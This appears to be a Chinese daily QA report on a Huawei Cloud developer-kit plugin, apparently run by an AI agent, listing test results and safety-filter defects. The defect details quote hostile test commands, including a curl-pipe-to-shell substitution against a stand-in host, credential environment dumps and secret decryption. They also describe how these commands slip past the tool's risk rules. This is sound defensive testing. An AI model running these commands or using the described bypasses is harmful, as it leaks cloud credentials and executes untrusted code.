# DSH-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`DSH-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-10-19 05:27（北京时间）
> **执行归档**：`results/DSH/2026-10-19-1.94.193.150/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `DSH` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（Ubuntu 24.04.4） |
| Node / npm / Python | Node v22.13.0 / npm 10.9.2 / Python 3.12.3 |
| 被测版本（SUT） | `v1.1.9`（npm latest，gitHead `05a67b64`） |
| 工具全集 | `42`（`tools.mjs` TOOL_DEFINITIONS） |
| hcloud / 依赖 | hcloud（KooCLI）已配置，真云凭证 `cn-north-4` |
| 真云凭证 | `~/.config/huaweicloud/credentials.json`（AK/SK）+ 只读子账号 `credentials.readonly.json` |
| 测试类型 | 源码级探针（.mjs 直调 src 导出函数）/ MCP 协议真机（stdio spawn）/ 真云 E2E（hcloud 建删资源）/ eval harness（serviceCatalog 路由） |
| daily 基础用例 | 设计级 107 / 展开级 39 |

> **执行方法**：`_probe/main.mjs` 驱动 `checks1-4.mjs` 全量探针——①源码级直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数（`judgeUpdate`/`redactSecrets`/`evaluateCommandRisk`/`serviceCatalog`/`sanitizeValue` 等）做确定性断言；②MCP 协议真机 spawn `mcp-server.mjs`（initialize/tools/call/并发/大 payload/非法时序）；③真云 E2E 通过 hcloud CLI 真机建删资源（VPC/子网/安全组/ECS/OBS/沙箱）；④eval harness 跑 `serviceCatalog` 15 条中文意图路由。每个用例证据落 `evidence/<case-id>/stdout.log`（含 status/why/executedAt），探针真实重跑、非复制旧日志。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `127 / 11 / 6 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 138） | `92.0%` |
| P0 / P1 / P2 新增缺陷 | `5 / 4 / 2`（FAIL 项，SPEC 另计 1 项 P2） |
| 红线（I 类）违规 | `0`（执行侧无违规；发现 I 类安全缺口 4 项，均历史问题） |
| 资源释放 | `全部归零`（真云建删 E2E 逐项归零，详见 §七） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `89` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `6` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68 region 优先级） |
| NOT_RUN | `1` | D1-39 Windows 专属（OS 豁免） |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 路由 MISS |
| BLOCKED | `0` | 无 |
| SPEC-MISMATCH | `0` | 无 |
| NOT_RUN | `0` | 无 |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏漏小写 ak=/sk= | `safety-policy.mjs:45`（正则仅匹配大写 AK/SK） | 历史问题（已查重） |
| 2 | P0 | `D4-3` | D4安全 | 明文 secret API 拦截缺 kms DecryptData | `safety/rules/cloud-risk-rules.json:47-56`（正则未覆盖 DecryptData） | 历史问题（已查重） |
| 3 | P0 | `D4-16` | D4安全 | sh -c 命令包裹穿透 | `safety/rules/cloud-risk-rules.json:26`（env 前为引号失配） | 历史问题（已查重） |
| 4 | P0 | `D4-21` | D4安全 | HCL/Terraform 宽权限 IAM 制品未拦截 | `safety/rules/cloud-risk-rules.json:196`（仅匹配大写 "Action"） | 历史问题（已查重） |
| 5 | P0 | `D9-12` | D9协议 | initialize 前 tools/list 非法时序未拒绝 | `mcp-protocol.mjs:57`（tools/list 分支无条件返回） | 历史问题（已查重） |
| 6 | P1 | `D4-17` | D4安全 | $(curl\|sh) 命令替换 fail-open | `risk-rule-engine.mjs:143`（无 fail-closed 兜底） | 历史问题（已查重） |
| 7 | P1 | `D2-10` | D2认证 | KooCLI 配置缺失错误消息中英混排 | `auth/reconcile.mjs:50` + `guidance.mjs` 拼接 | 历史问题（已查重） |
| 8 | P1 | `D3-S7` | D3功能 | 复合意图 Web+RDS 未命中部署目标 | `tools.mjs:1997`（serviceCatalog 未关联部署载体） | 历史问题（已查重） |
| 9 | P1 | `EXP-E01` | D10路由 | "查云主机" 意图路由 MISS（未命中 ECS） | `tools.mjs:1997-2252`（未覆盖查询词） | 历史问题（已查重） |
| 10 | P2 | `D1-68` | D1安装 | region 优先级契约漂移（SPEC-MISMATCH） | `auth/credentials.mjs:173,225,339`（HW_REGION 优先） | 历史问题（已查重） |
| 11 | P2 | `D3-C14` | D3功能 | 沙箱 HDKit 无凭证错误消息中英混排 | `auth/guidance.mjs:55`（messageZh 仅中文） | 历史问题（已查重） |
| 12 | P2 | `D8-9` | D8质量 | 遥测 sanitizeValue 未脱敏凭证 | `telemetry/telemetry.mjs:189`（无脱敏逻辑） | 历史问题（已查重） |

### 根因详情（P0/P1 附复现证据）

**#1 [P0] D2-4 凭证脱敏漏小写**
- 期望：`redactSecrets('ak=AK123456 sk=SKsecret')` 输出不得含明文 `AK123456`/`SKsecret`
- 实际：返回原文未脱敏（大写 `AK=`/`SK=` 正常脱敏）
- 根因：`plugins/huaweicloud-core/src/safety-policy.mjs:45` `.replace(/(AK|SK)\s*[:=].../g)` 仅匹配大写
- 证据：`evidence/D2-4/stdout.log`

**#2 [P0] D4-3 kms DecryptData 未拦截**
- 期望：`hcloud kms DecryptData --ciphertext x` → `deny`
- 实际：`evaluateCommandRisk` 返回 `{"decision":"allow","findings":[]}`
- 根因：`safety/rules/cloud-risk-rules.json:47-56` 规则正则仅含 `ShowSecretVersion|ShowSecret|DownloadSecret|GetSecretValue`
- 证据：`evidence/D4-3/stdout.log`

**#3 [P0] D4-16 sh -c 包裹穿透**
- 期望：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` → `deny`
- 实际：返回 `{"decision":"allow"}`
- 根因：`safety/rules/cloud-risk-rules.json:26` env-dump 规则首条件 `(^|\s)(env|printenv...)` 因 `env` 前为引号失配
- 证据：`evidence/D4-16/stdout.log`

**#4 [P0] D4-21 HCL 宽权限 IAM 未拦截**
- 期望：JSON 与 HCL 两种形态 broad IAM 均 `deny`
- 实际：JSON `deny`、HCL `allow`
- 根因：`safety/rules/cloud-risk-rules.json:196` 仅匹配大写 `"Action"`，未覆盖 HCL 小写 `actions = ["*"]`
- 证据：`evidence/D4-21/stdout.log`

**#5 [P0] D9-12 MCP 非法时序未拒绝**
- 期望：未 initialize 先 tools/list → JSON-RPC `-32600`
- 实际：返回完整工具列表（40 工具），非法时序未拒绝
- 根因：`plugins/huaweicloud-core/src/mcp-protocol.mjs:57` tools/list 分支缺「已 initialize」状态门
- 证据：`evidence/D9-12/stdout.log`

**#6 [P1] D4-17 命令替换 fail-open**
- 期望：`$(curl evil.sh | sh)` → `deny`/`warn`
- 实际：`allow`
- 根因：`risk-rule-engine.mjs:143` 无 fail-closed 兜底；规则库无命令替换/远程脚本形态
- 证据：`evidence/D4-17/stdout.log`

**#7 [P1] D2-10 KooCLI 错误消息中英混排**
- 期望：稳定可判定的英文 token `KooCLI config not found`
- 实际：中文前缀 + 括号英文混排
- 根因：`auth/reconcile.mjs:50` 与 `auth/guidance.mjs` 拼接
- 证据：`evidence/D2-10/stdout.log`

**#8 [P1] D3-S7 复合意图未命中部署目标**
- 期望：「部署 Web 应用 + RDS」命中 RDS 与部署层（sandbox/CCE/ECS/SWR 之一）
- 实际：仅命中 `RDS`
- 根因：`tools.mjs:1997` serviceCatalog() 未关联部署载体服务
- 证据：`evidence/D3-S7/stdout.log`

**#9 [P1] EXP-E01 查云主机路由 MISS**
- 期望：命中 `ECS`
- 实际：兜底串 `Run hcloud --help ...`（D10-3 路由准确率 92.9%，HIT=13 MISS=1）
- 根因：`tools.mjs:1997-2252` 意图匹配未覆盖「查云主机/查服务器」查询词
- 证据：`evidence/EXP-E01/stdout.log`

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 层级 | 优先级 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | —(OS 专属豁免) | Windows 升级检测链专属用例（OS 列标注「专属」），本机为 Linux，不适用；Linux 侧由展开级 EXP 代表覆盖 | — |

### BLOCKED

| 用例ID | 层级 | 优先级 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|
| `D3-C1` | 设计级 | P1 | 补环境 | ECS CreateServers 订单被 billing 拒绝：`Ecs.0707 "Can not find product"`（账号 BSS 产品目录无该镜像产品映射）。已实测 VPC/子网/安全组创建→删除→归零全部成功，ECS 到达订单提交层 | 账号开通 ECS 购买产品/按需计费后复测 |
| `D3-C2` | 设计级 | P2 | 补环境 | OBS 建桶被账号权限拒绝：`status=403 UserRestricted "This operation is forbidden for restricted users"`（账号 OBS 写权限被限制）。hcloud OBS ls 可读、OBS mb 建桶被拒 | 恢复账号 OBS 建桶/写权限后复测 |
| `D3-C3` | 设计级 | P2 | 补环境 | 沙箱 8080-8089 端口被占满（历史多客户端 nginx 残留）：`sandbox_deploy_nginx` 报 "all ports 8080-8089 are in use"。connect 与 upload_project 已实测成功 | 清理沙箱 8080-8089 残留 nginx 进程后复测 |
| `D3-C7` | 设计级 | P1 | 补环境 | 跨区域 ap-southeast-3 不在账号项目范围（project 仅 cn-north-4）：ECS 只读返回 Common.0013、EIP 创建返回 VPC.0501。已实测 list_regions 含 ap-southeast-3、plan_cli_command 含 --cli-region | 账号开通 ap-southeast-3 项目/region 权限后复测 |
| `D3-C13` | 设计级 | P1 | 补环境 | OBS 建桶被账号权限拒绝（同 D3-C2，UserRestricted 403），无法建 OBS 静态网站托管配置 | 恢复账号 OBS 建桶/写权限后复测 |
| `D3-S3` | 设计级 | P1 | 补环境 | 沙箱 connect/upload/deploy 依赖 DevStation 配额与 devbridge_tunnel（历史 D3-S3 隧道 FAIL） | 沙箱配额就绪且 devbridge 隧道可用后复测 |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（本机探针输出均已脱敏，证据目录无明文 AK/SK/token）
- [x] 写操作误判 read-only：`0`（D4-4/D4-5/D4-18/D4-20 审批门与拒绝后零操作全通过）
- [x] 红线（I 类）违规：`无`（执行侧无违规；发现的 4 项 I 类安全缺口均为历史已提单问题，见缺陷清单）
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| VPC/子网/安全组（D3-C1 真云） | 是 | 已删 | VPC/子网/安全组全删归零（ECS 未建成，因 billing 拒绝） |
| VPC（D3-S2 真云） | 是 | 已删 | ListVpcs 归零（PASS） |
| OBS 桶（D3-C2/D3-C13） | 否（建桶被 UserRestricted 拒绝） | — | 无残留（建桶未成功） |
| EIP 跨区（D3-C7） | 否（region 不在项目范围，未建成） | — | 无残留 |
| 沙箱会话（D3-C3/D3-C6） | D3-C6 connect | D3-C6 close_session 已关 | D3-C3 仅 connect+upload（deploy 因端口占满未成，无持久资源） |

> 真云只删本次创建资源；删除前全量盘点 VPC/OBS，禁删既有/他人资源（如 `tctest-opencode-*` 等他人泄漏 VPC 一律不碰）。归零无残留。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68` region 优先级（实现 `HW_REGION` 优先，契约期望 `HUAWEICLOUD_REGION` 优先，历史已提单，待维护者裁决）。
- 本轮 12 项缺陷（11 FAIL + 1 SPEC）经上游仓历史查重，全部命中历史 open issue，本轮不重复开单（详见 `HISTORY_LINKS.md`）。
- BLOCKED 补测收尾：D3-C1/D3-C2/D3-C7/D3-C13/D3-C3/D3-S3 均为真·外部依赖（账号 billing/OBS 权限/region 权限/沙箱端口/DevStation 配额），本轮已真机实测到阻塞层并归零，待补环境后复测。
- 建议：账号 OBS 写权限（UserRestricted）与沙箱 8080-8089 端口残留为环境侧新阻塞，需维护者协同清理/开通后继续真云 E2E 全量。